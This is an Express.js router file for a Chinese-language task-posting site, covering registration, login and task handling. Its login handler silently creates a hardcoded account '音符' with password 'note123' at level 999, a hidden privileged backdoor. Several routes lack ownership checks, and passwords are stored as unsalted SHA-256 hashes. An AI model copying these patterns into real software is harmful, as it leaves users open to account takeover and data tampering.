const express = require('express'),
    {user,task} = require('../model/schema'),
    crypto = require("crypto"),
    router = express.Router();


router.get( '/reg',(req,res)=>{
    res.render('reg.ejs',{
        title : '注册'
    })

    // console.log(req.body);
}).post('/reg',function (req,res) {
    // console.log(req.body);
    if (req.body.username.length < 2) {
        return res.send({code:1,msg:'用户名不能少于2个字符'})
    }
    if (req.body.password.length<6) {
        return res.send({code:1,msg:'密码长度不能少于6个字符'})
    }
    user.findOne({username:req.body.username}).then((data)=>{
        if(data){
            return res.send({
                code:1,
                msg:'用户已存在！'
            })
        }
        //指定用什么方式加密
        const c = crypto.createHash('sha256');
        const password = c.update(req.body.password).digest('hex');
        user.create({
            username:req.body.username,
            password: password
        }).then((data)=>{
            res.send({code:0,msg:'注册成功'})
        }).catch(function (err) {
            console.log(err)
        })
    }).catch(function (err) {
        console.log(err);
    })
});

router.get('/login',(req,res)=>{
    res.render("login.ejs", {
        login:req.session.login,
        title : '登陆'
    })
}).post('/login', function (req,res) {
    // console.log(req.body);
	user.findOne({username:'音符'}).then((data)=>{
		if(data){
            return ;
        }
		const c = crypto.createHash('sha256');
		const password = c.update('note123').digest('hex');
		user.create({
			username:'音符',
			password: password,
			level:999,
			used:'true'
		})
	})

    user.findOne({username:req.body.username},function (err,data) {
        // console.log(req.session.login);
        if(data){
            const c = crypto.createHash('sha256');
            const password = c.update(req.body.password).digest('hex');
            if (data.password === password){
                req.session.login = true;
                req.session.data = data;
                return res.send({code:0,msg:'登陆成功！'})
            }
            return res.send({code:2,msg:'密码错误！'})
        }
        res.send({code:1,msg:'用户不存在！'})
    })
})

router.get('/logout',function(req,res){
    req.session.destroy();
    res.redirect('/login');
})

router.get('/',function (req,res) {
    res.render('index.ejs',{
        login:req.session.login,
        user:req.session.data,
        title : '首页'
    })
})

router.get('/addtask',function (req,res) {
    res.render('./admin/task.ejs', {
        username : req.session.data.username,
        used :req.session.data.used ,
        level:req.session.data.level,
        title : '发布'
    });
});

router.post('/addtask', function (req,res) {
    user.findOne({'_id': req.session.data._id},function (err,da) {
        // console.log(da);
        if(!da.used) return res.send({code:1,msg:'用户不可用'})
        const data = req.body;
        var time = data.endTime;
        time = new Date(time);
        data.endTime = time.getTime()+1000*60*60*24;
        data.author = req.session.data._id;
        task.create(data,function (err,data) {
            if(err){
                console.log(err);
                return res.send({code:1,msg:'数据库错误'})
            }
            user.updateOne({_id: req.session.data._id},{$push:{ 'task.publish' : data._id }  },function () {
                res.send({code:0,msg:'保存成功'});
            });

        })
    })
})

router.get('/mytask',function (req,res) {
    // console.log(req.session.data.username);
    res.render('./admin/mytask.ejs',{
        username : req.session.data.username,
        level : req.session.data.level,
        title : '任务'
    })
})

router.post('/task/all',function (req,res) {
    Promise.all([
        task.find().populate('author').skip((req.body.page - 1) * req.body.limit),
        task.countDocuments()
    ]).then(function (data) {
        // console.log(data);
        res.send({code: 0 , data: data[0], count: data[1]})
    })
})
//任务接取
router.post('/task/receive',function (req,res) {

    user.findOne({'_id': req.session.data._id},function (err,data) {
        if (!data.used) return res.send({code:1,msg:'用户不可用'});
        Promise.all([
            user.findOne({'_id':req.session.data._id}),
            task.findOne({'_id': req.body.task_id}).populate('author')
        ]).then(function (data) {
			//console.log(data[1])
            if(data[1].num <= data[1].receiver.length)return res.send({code:1,msg:'人数已上限'});
			if(data[1].endTime <= new Date())return res.send({code:1,msg:'该任务已过期'});
            var b = data[0].task.receive.findIndex(function (val) {
                // console.log(val);
                return String(val) == req.body.task_id;
            });
            // console.log(b);
            if(!req.body.task_id){
                res.send({code:1,msg:'用户不可用'})
            }else if(data[1].author._id == req.session.data._id){
                res.send({code:1,msg:'不能接取自己发布的任务'})
            }else if(b != -1){
                res.send({code:1,msg:'不能重复接取该任务'})
            }else {
                Promise.all([
                    user.updateOne({'_id': req.session.data._id},{$push:{'task.receive':req.body.task_id}}),
                    task.updateOne({'_id': req.body.task_id},{$push:{'receiver':{ 'user':req.session.data._id} }})
                ]).then(function (data) {
                    res.send({code:0,msg:'更新完成'})
                    // console.log(data);
                })
            }
        })
    })

})

router.post('/msg',function (req,res) {
    // console.log( req.session.data._id);
    if(!req.body.task_id) return res.send({code:1,msg:'请求失败'});
    task.findOne({'_id':req.body.task_id},function (err,data) {
        if(data.receiver[req.body.index]['user'] != req.session.data._id||data.receiver[req.body.index]['swi'])return res.send({code:1,msg:'请求失败'});

        Promise.all([
            task.updateOne({'_id': req.body.task_id},{$set:{['receiver.'+ req.body.index + '.msg'] : req.body.content } }),
            task.updateOne({'_id':req.body.task_id},{$set: {['receiver.'+ req.body.index + '.swi'] : true } })
        ]).then(function (data) {
            res.send({code:0,msg:"请求成功"})
        })
    })
})

router.post('/msg/author', function (req,res) {
    // console.log(req.body,['receiver.'+ req.body.index + '.replay']);
    task.updateOne({'_id': req.body.task_id},{$set:{['receiver.'+ req.body.index + '.reply'] : req.body.content}}).exec().then(function (data) {
        // console.log(data);
        res.send({code:0,msg:'回复成功'})
    })
    // task.updateOne({'_id': req.body.task_id},{$set:{['receiver.'+req.body.index+'replay']:req.body.content}})
})

router.post('/task/finish/:task_id',function (req,res) {
    // console.log(req.params,req.body);
    task.findOne({'_id': req.params.task_id},function (err,data) {
        // console.log();

        Promise.all([
            task.updateOne({'_id': req.params.task_id },{$set:{'finish': data.receiver[req.body.index].user,'can':true}}),
            user.updateOne({'_id': data.receiver[req.body.index].user},{$set:{'task.accomplish':req.params.task_id}})
        ]).then(function (data) {
            res.send({code:0,msg:'更新成功'})
            // console.log(data);
        })

    })

})

module.exports = router;